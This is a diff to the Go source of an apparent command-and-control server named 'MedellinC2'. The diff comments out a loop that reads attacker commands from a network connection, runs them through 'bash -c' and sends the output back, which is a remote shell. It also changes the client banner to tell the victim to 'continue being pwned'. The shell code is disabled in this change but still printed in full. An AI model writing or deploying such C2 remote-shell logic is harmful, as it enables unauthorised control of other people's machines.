@@ -10,7 +10,6 @@ import (
 	"io"
 	"log"
 	"net"
-	"os/exec"
 	"strings"
 	"time"
 
@@ -77,22 +76,22 @@ func handleClientRequest(con net.Conn) {
 		}
 
 		// Responding to the client request
-		if _, err = con.Write([]byte("Command succesfully executed. Successfully Connected to MedellinC2! Please Continue interacting with your agent\n")); err != nil {
-			//generateAgent() //If an agent connects then generate an agent
+		if _, err = con.Write([]byte("Successfully Connected to MedellinC2! Please await commands from the C2 server and continue being pwned!\n")); err != nil {
 			log.Printf("failed to respond to client: %v\n", err)
 		}
 
-		//attacker commmands
-		for {
-			attackerCommands, _ := bufio.NewReader(con).ReadString('\n')
-			cmd := exec.Command("bash", "-c", attackerCommands)
-			if err != nil {
-				log.Fatalln(err)
-			}
-			out, _ := cmd.CombinedOutput()
+		//COMMANDS TO GIVE REMOST HOST A SHELL
+		/*
+			for {
+				attackerCommands, _ := bufio.NewReader(con).ReadString('\n')
+				cmd := exec.Command("bash", "-c", attackerCommands)
+				if err != nil {
+					log.Fatalln(err)
+				}
+				out, _ := cmd.CombinedOutput()
 
-			con.Write(out)
-		}
+				con.Write(out)
+			} */
 		//if connection closes after some commands were ran print to server console
 	}
 }
